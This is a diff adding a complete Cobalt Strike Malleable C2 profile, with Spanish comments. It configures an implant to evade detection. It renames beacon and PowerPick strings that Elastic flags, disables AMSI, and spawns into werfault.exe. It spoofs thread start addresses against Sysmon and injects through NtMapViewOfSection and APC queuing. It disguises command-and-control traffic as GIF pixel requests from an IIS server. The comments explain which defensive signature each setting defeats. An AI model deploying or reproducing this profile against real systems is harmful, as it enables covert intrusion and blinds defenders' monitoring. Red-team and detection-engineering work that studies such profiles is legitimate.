@@ -1,0 +1,144 @@
+# Definitive Malleable C2 Profile
+# Cobalt Strike 4.12
+
+set sample_name "Operative";
+set sleeptime "2000";
+set jitter "20";
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.7922.72 Safari/537.36";
+set host_stage "true";
+
+stage {
+    set userwx "false";
+    set cleanup "true";
+    set obfuscate "true";
+    set copy_pe_header "false";
+    set module_x64 "xpsservices.dll";
+
+    transform-x64 {
+        # Renombra strings internas del beacon — Elastic/Sysmon tienen estas firmadas
+        strrep "beacon.x64.dll" "system.x64.dll";
+        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
+        strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
+        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
+    }
+}
+
+post-ex {
+    set amsi_disable "true";
+    set spawnto_x64 "%windir%\\sysnative\\werfault.exe";
+    set spawnto_x86 "%windir%\\syswow64\\werfault.exe";
+    set obfuscate "true";
+    set smartinject "true";
+    set cleanup "true";
+
+    # dotnet-diagnostic imita pipes reales del runtime .NET
+    # UUID format imita pipes de COM y WMI — ambos presentes en cualquier Windows
+    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
+
+    # Threads que nacen desde ntdll!RtlUserThreadStart parecen legítimos
+    # Evita la detección de start address anómala en Sysmon Event ID 8
+    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
+
+    transform-x64 {
+        # Renombra strings de error de PowerPick y ExecuteAssembly
+        # Elastic tiene estas exactas como firmas de alta prioridad
+        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
+        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
+        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
+        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
+    }
+}
+
+process-inject {
+    # NtMapViewOfSection: mapea una sección compartida en vez de allocar nueva memoria
+    # Evita la secuencia VirtualAlloc->WriteProcessMemory->CreateThread que es firma conocida
+    set allocator "NtMapViewOfSection";
+    set bof_allocator "VirtualAlloc";
+    set bof_reuse_memory "true";
+    set min_alloc "16384";
+    set startrwx "false";
+    set userwx "false";
+
+    transform-x64 {
+        # NOP sled rompe firmas estáticas del shellcode
+        prepend "\x90\x90\x90\x90\x90\x90\x90\x90";
+    }
+
+    transform-x86 {
+        prepend "\x90\x90\x90\x90\x90\x90\x90\x90";
+    }
+
+    execute {
+        # CreateThread con thread_hint: el hilo aparece iniciado desde ntdll legítimo
+        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
+        # APC en hilo suspendido: técnica usada por Windows internamente
+        NtQueueApcThread-s;
+        # Modifica contexto de hilo existente: no crea estructuras nuevas
+        SetThreadContext;
+        # Fallback sin suspended requirement
+        NtQueueApcThread;
+    }
+}
+
+http-get {
+    set uri "/cat.gif /image /pixel.gif /logo.gif";
+    client {
+        header "Accept" "text/html,image/avif,image/webp,*/*";
+        header "Accept-Language" "en-US,en;q=0.9";
+        header "Accept-Encoding" "gzip, deflate";
+        header "Referer" "https://www.google.com";
+        parameter "utm" "ISO-8859-1";
+        parameter "utc" "en-US";
+        metadata {
+            base64;
+            header "Cookie";
+        }
+    }
+    server {
+        header "Content-Type" "image/gif";
+        header "Server" "Microsoft IIS/10.0";
+        header "X-Powered-By" "ASP.NET";
+        output {
+            prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
+            prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
+            prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/submit.aspx /finish.aspx";
+    client {
+        header "Content-Type" "application/octet-stream";
+        header "Accept" "text/html,image/avif,image/webp,*/*";
+        header "Accept-Language" "en-US,en;q=0.9";
+        header "Accept-Encoding" "gzip, deflate";
+        header "Referer" "https://www.google.com";
+        id {
+            parameter "id";
+        }
+        output {
+            print;
+        }
+    }
+    server {
+        header "Content-Type" "text/plain";
+        header "Server" "Microsoft IIS/10.0";
+        header "X-Powered-By" "ASP.NET";
+        output {
+            netbios;
+            prepend "<!DOCTYPE html><html><head><title></title></head><body><h1>";
+            append "</h1></body></html>";
+            print;
+        }
+    }
+}
+
+http-stager {
+    server {
+        header "Content-Type" "application/octet-stream";
+        header "Server" "Microsoft IIS/10.0";
+        header "X-Powered-By" "ASP.NET";
+    }
+}
